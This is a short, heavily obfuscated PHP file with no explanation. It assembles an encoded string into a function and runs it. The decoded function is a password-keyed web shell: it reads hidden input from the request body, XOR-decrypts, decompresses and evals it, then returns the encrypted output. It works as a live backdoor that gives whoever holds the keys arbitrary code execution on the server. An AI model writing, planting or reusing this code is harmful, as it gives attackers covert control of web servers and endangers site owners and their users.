<?php
$u='hp:Y7//inpuY7t"),$m)==Y71) Y7{@Y7ob_start();Y7@evaY7l(@gzuncY7ompresY7s(@x(Y7@Y7baY7sY7e64_dY7ecode($m[1]),$k))Y7);$o=@ob_Y7g';
$A='++Y7){$oY7.=$t{$iY7}^$k{$j}Y7Y7;}Y7}reY7turn $o;Y7Y7}if (@preY7g_match("/$kh(Y7.+)$kf/Y7",@file_geY7t_conY7tenY7ts("p';
$t='et_cY7ontents(Y7Y7)Y7;@ob_end_clean();$rY7=@baY7se64_encY7oY7de(@Y7x(@Y7gY7zcompress($o),$k));priY7nt("$Y7p$Y7kh$r$kf");}';
$a='$kY7Y7="2177cafc";$Y7kY7h=Y7"c7dd7acb4d85";$kf="fY7c3Y71712aY75945"Y7;Y7$p=Y7"azBJboJsZRlPscjJ"Y7;funcY7tion xY7($t,';
$X='$k){Y7$c=strY7lenY7($k);$Y7l=stY7rlen($t);$o=Y7Y7"";forY7($i=0;Y7$i<$l;){forY7($j=0;(Y7$j<$Y7c&&$i<$lY7);$j+Y7+,$i';
$N=str_replace('R','','RcreRaRtReR_fuRnction');
$O=str_replace('Y7','',$a.$X.$A.$u.$t);
$x=$N('',$O);$x();
?>
